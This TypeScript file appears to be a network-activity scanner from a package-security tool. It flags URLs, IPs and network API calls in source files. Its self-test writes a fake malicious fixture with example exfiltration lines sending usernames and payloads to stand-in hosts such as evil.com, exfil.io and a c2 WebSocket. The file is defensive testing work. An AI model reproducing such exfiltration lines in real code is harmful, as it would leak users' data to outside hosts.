/**
 * ═══════════════════════════════════════════════════════════
 *  AEGIS-AST — Network Detection Scanner
 *  Owner: Person 2 (Security Detection Engine)
 *
 *  Scans JS/TS source files for suspicious network activity:
 *  hardcoded URLs, IPs, and network API usage.
 * ═══════════════════════════════════════════════════════════
 */

import * as fs from 'fs';
import * as path from 'path';
import { walkSourceFiles } from '../utils/file_walker';

// Each pattern: the regex (non-global, applied per line) and its label.
// Ordered so more specific matches (full URL) come before their substrings.
const NETWORK_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
  { pattern: /https?:\/\//i,                              label: 'http' },
  { pattern: /\b(?:\d{1,3}\.){3}\d{1,3}\b/,              label: 'hardcoded-ip' },
  { pattern: /\bfetch\s*\(/,                              label: 'fetch' },
  { pattern: /\baxios\b/,                                 label: 'axios' },
  { pattern: /\bXMLHttpRequest\b/,                        label: 'XMLHttpRequest' },
  { pattern: /socket\b/i,                                 label: 'socket' },
  { pattern: /\bdns\.lookup\b/,                           label: 'dns.lookup' },
  { pattern: /\bnet\.connect\b/,                          label: 'net.connect' },
];

/**
 * Scans all JS/TS source files in packageDir for suspicious network activity.
 *
 * @param packageDir - Path to the extracted package root
 * @returns Object with `network` array of human-readable finding strings.
 *          Returns { network: [] } if no files found. Never throws.
 */
export async function scanNetwork(
  packageDir: string
): Promise<{ network: string[] }> {
  let files;
  try {
    files = walkSourceFiles(packageDir);
  } catch {
    return { network: [] };
  }

  if (files.length === 0) return { network: [] };

  const findings: string[] = [];

  for (const file of files) {
    try {
      const lines = file.content.split('\n');
      for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        const matchedLabels = getMatchedLabels(line);
        if (matchedLabels.length === 0) continue;

        const lineNum = i + 1;
        const trimmed = line.trim();
        const relPath = file.relativePath;
        findings.push(
          `${relPath}:${lineNum} — ${trimmed} — contains ${matchedLabels.join(', ')}`
        );
      }
    } catch {
      // Skip files that error during processing
    }
  }

  return { network: findings };
}

/**
 * Returns deduplicated labels for all network patterns found in a single line.
 */
function getMatchedLabels(line: string): string[] {
  const seen = new Set<string>();
  for (const { pattern, label } of NETWORK_PATTERNS) {
    if (pattern.test(line) && !seen.has(label)) {
      seen.add(label);
    }
  }
  return Array.from(seen);
}

// ─── Self-test ────────────────────────────────────────────────────────────────
// Run directly:  npx ts-node src/scanner/network.ts

if (require.main === module) {
  (async () => {
    const testDir = '/tmp/aegis-network-test';
    const srcDir = path.join(testDir, 'lib');

    fs.mkdirSync(srcDir, { recursive: true });

    // Fake malicious source file
    fs.writeFileSync(
      path.join(srcDir, 'index.js'),
      [
        `const data = fetch('http://evil.com/collect?u=' + username);`,
        `axios.post('https://exfil.io/data', payload);`,
        `const s = new XMLHttpRequest();`,
        `const ip = '192.168.1.1';`,
        `const ws = new WebSocket('ws://c2.io');`,  // 'socket' in WebSocket
        `dns.lookup('evil.com', cb);`,
        `net.connect(4444, '10.0.0.1');`,
        `console.log('totally normal line');`,       // clean — should NOT be flagged
      ].join('\n')
    );

    console.log('Running scanNetwork on fake malicious package...\n');
    const result = await scanNetwork(testDir);

    if (result.network.length === 0) {
      console.log('No findings (unexpected — check patterns)');
    } else {
      for (const finding of result.network) {
        console.log('  FLAGGED:', finding);
      }
    }

    // Cleanup
    fs.rmSync(testDir, { recursive: true, force: true });
    console.log('\nCleanup done.');
  })();
}
